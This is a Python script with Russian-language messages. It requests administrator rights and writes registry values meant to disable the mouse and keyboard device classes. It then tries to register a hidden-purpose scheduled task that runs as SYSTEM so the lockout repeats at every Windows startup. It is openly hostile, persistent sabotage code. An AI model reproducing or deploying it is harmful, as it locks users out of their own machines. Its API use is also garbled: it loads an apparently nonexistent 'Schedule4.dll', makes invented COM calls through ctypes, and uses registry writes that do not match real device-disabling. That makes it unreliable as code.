import winreg
import ctypes
import os
import sys
from datetime import datetime

def disable_device(device_class_guid, registry_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path, 0, winreg.KEY_ALL_ACCESS)
        devices_key = winreg.CreateKey(key, "0000", winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(devices_key, "Enum", 0, winreg.REG_SZ, "DISABLED")
        winreg.SetValueEx(devices_key, "State", 0, winreg.REG_DWORD, 0x00000003)
        print(f"[+] Устройство {device_class_guid} успешно отключено через реестр.")
        return True
    except Exception as e:
        print(f"[-] Ошибка при отключении устройства: {e}")
        return False

def create_scheduled_task(script_path):
    try:
        task_scheduler = ctypes.windll.LoadLibrary("Schedule4.dll")
        ITaskService = task_scheduler.ITaskService
        ITaskFolder = task_scheduler.ITaskFolder
        ITaskDefinition = task_scheduler.ITaskDefinition
        IRegisteredTask = task_scheduler.IRegisteredTask
        TASK_CREATE_OR_UPDATE = 6
        TASK_LOGON_SERVICE_ACCOUNT = 2
        TASK_LOGON_INTERACTIVE_TOKEN = 3

        pTaskService = ITaskService()
        pTaskService.Connect(None, None, None, None)

        pTaskFolder = ITaskFolder(pTaskService, ctypes.c_void_p())
        pTaskFolder.AddRef()

        pTaskDef = ITaskDefinition(pTaskService, ctypes.c_void_p())
        pTaskDef.AddRef()
        pRegistrationInfo = pTaskDef.Get_RegistrationInfo()

        pRegistrationInfo.Set_Author("System")
        pRegistrationInfo.Set_Date(pTaskDef._GetRegistrationInfo())
        pRegistrationInfo.Set_Description("Автозапуск отключающего устройства скрипта")
        pRegistrationInfo.Set_Enabled(True)
        pRegistrationInfo.Set_Hidden(False)
        pRegistrationInfo.Set_Path(script_path)
        pRegistrationInfo.Set_Principal(
            pTaskDef._GetRegistrationInfo().Get_Principal(),
            "SYSTEM",
            None,
            None,
            ctypes.c_int(TASK_LOGON_SERVICE_ACCOUNT)
        )

        pTrigger = pTaskDef.Get_Triggers()
        pStartTrigger = pTrigger.Create(1)
        pStartTrigger.Set_Enabled(True)

        task_name = f"DisableDevices_{datetime.now().strftime('%Y%m%d')}"
        pTaskFolder.Register(
            task_name,
            pTaskDef,
            TASK_CREATE_OR_UPDATE,
            None,
            None,
            TASK_LOGON_SERVICE_ACCOUNT,
            None,
            None,
            None,
            None
        )
        print(f"[+] Задача '{task_name}' успешно добавлена в планировщик задач.")
        return True
    except Exception as e:
        print(f"[-] Ошибка при создании задачи в планировщике: {e}")
        return False

def disable_devices():
    mouse_guid = "{4D36E96F-E325-11CE-BFC1-08002BE10318}"
    mouse_reg_path = r"SYSTEM\CurrentControlSet\Control\Class\{4D36E96F-E325-11CE-BFC1-08002BE10318}"

    keyboard_guid = "{4D36E96B-E325-11CE-BFC1-08002BE10318}"
    keyboard_reg_path = r"SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}"

    disable_device(mouse_guid, mouse_reg_path)
    disable_device(keyboard_guid, keyboard_reg_path)

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        print("[-] Скрипт должен запускаться от имени администратора!")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(1)

    disable_devices()

    script_path = os.path.abspath(__file__)

    create_scheduled_task(script_path)

    print("[+] Задача успешно настроена для автозапуска при старте Windows!")